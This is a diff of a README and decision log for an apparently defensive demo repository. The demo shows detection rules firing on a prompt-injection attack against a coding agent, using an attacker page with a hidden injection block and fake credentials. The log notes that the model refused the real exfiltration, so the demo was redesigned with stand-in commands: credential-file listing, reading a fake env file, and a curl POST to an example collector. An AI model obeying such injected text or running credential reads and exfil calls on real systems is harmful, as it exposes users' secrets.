@@ -24,7 +24,7 @@ the stage runbook, and the design docs for the slide deck. Read `docs/` before c
 ```
 README.md, src/, config.yaml   # the "Orderbook Service" — a harmless target project the agent reads during the demo
 .claude/settings.json          # tags sessions as deployment dss-demo-dev (do not change to dss-demo)
-sandbox-home/                  # HOME for the demo session: FAKE ~/.aws/credentials and ~/.ssh/id_demo
+sandbox-home/                  # HOME for the demo session: FAKE ~/.aws/credentials, ~/.ssh/id_demo, demo-fixtures/sample.env (fake tokens)
 pages/vendor-notes.html        # the "attacker page": vendor release notes with a hidden prompt-injection block, served by GitHub Pages
 demo/setup.sh                  # one-shot laptop setup: installs the hook plugin, wires ~/.claude/settings.json, --verify/--uninstall
 demo/run-demo.sh               # launches Claude Code with HOME=sandbox-home and deployment dss-demo
@@ -122,4 +122,11 @@ server feature and use the recorded demo, not this stack. Open items: speaker na
 - 2026-10-06: no hold in the live demo (app has no hold feature); no OTel; four `demo_` MVs created;
   installed dashboard edited in place rather than a new one; attacker page hosted as a gist/Pages.
 - 2026-10-07: repo published public at github.com/timeplus-io/agentguard-demo-target; attacker page served by GitHub Pages from `main`.
+- 2026-10-07: live demo redesigned to use **benign signature commands** instead of asking the agent to steal
+  credentials. A well-aligned model (Fable 5.1 and the other Claude Code models) correctly refuses the real
+  exfil, so the chain never fired. The rules match tool-call *signatures* in telemetry, so benign stand-ins
+  trigger them: WebFetch the page (probe + demo-001), `grep` the page for the hidden block (injection stage +
+  demo-001), `ls ~/.aws/credentials ~/.ssh/id_demo` (credential_access), `cat sandbox-home/demo-fixtures/sample.env`
+  (rp-002), `curl --data status=ok https://collector.example.invalid/x` (demo-003 + exfiltration → demo-chain).
+  Verified live 2026-10-07: all five rules fired in one session with no refusal. See `demo/RUNBOOK.md`.
 - 2026-10-06: presentations docs moved here from the neutron repo; dev sessions tagged `dss-demo-dev`.
